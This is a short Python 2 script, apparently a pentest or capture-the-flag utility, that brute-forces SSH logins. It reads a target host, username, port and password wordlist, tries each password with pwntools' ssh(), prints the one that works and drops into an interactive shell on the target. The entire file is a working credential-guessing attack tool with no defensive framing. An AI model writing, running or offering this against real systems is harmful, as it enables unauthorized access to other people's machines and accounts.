#!/usr/bin/env python2

from pwn import *
import sys

host = raw_input("Host: ").strip('\n')
username = raw_input("Username: ").strip('\n')
port = raw_input("Port: ").strip('\n')
if len(port) == 0:
	port = 22
file = raw_input("Password File: ").strip('\n')

try:
	password_file = open(file)
	for i in password_file.readlines():
		password = i.strip("\n")
		try:
			r = ssh(host=host,user=username,password=password,port=int(port))
			print "Password Found!: " + i
			r.interactive()
			sys.exit()
		except Exception, e:
			print e
	print "Password Not Found"
except IOError:
	print "Password file '" + file + "' does not exist!"